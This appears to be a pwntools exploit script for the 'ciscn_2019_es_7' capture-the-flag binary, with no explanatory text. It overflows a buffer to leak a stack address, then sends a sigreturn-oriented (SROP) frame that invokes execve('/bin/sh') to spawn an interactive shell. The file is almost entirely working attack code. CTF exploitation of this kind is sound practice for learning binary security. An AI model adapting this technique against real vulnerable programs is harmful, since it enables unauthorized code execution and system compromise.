# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

proc_name = 'ciscn_2019_es_7'
p = process(proc_name)
elf = ELF(proc_name)

sys_ret = 0x0400517
sigreturn_addr = 0x04004DA
vuln_addr = 0x04004F1
#vuln_addr = elf.sym['vuln']
print('vuln_addr: ', hex(vuln_addr))
system_addr = 0x04004E2
 
payload1=  '/bin/sh\x00' + 'k1ose2jo' + p64(vuln_addr)
p.send(payload1)
p.recv(0x20)
rsp_e8 = u64(p.recv(6).ljust(8,'\x00'))
p.recv(8)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = rsp_e8 - 0x110
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = rsp_e8
sigframe.rip = sys_ret

payload2 = '/bin/sh\x00' + 'k1ose2jo' + p64(sigreturn_addr) + p64(sys_ret) + str(sigframe)
p.sendline(payload2)
p.interactive()
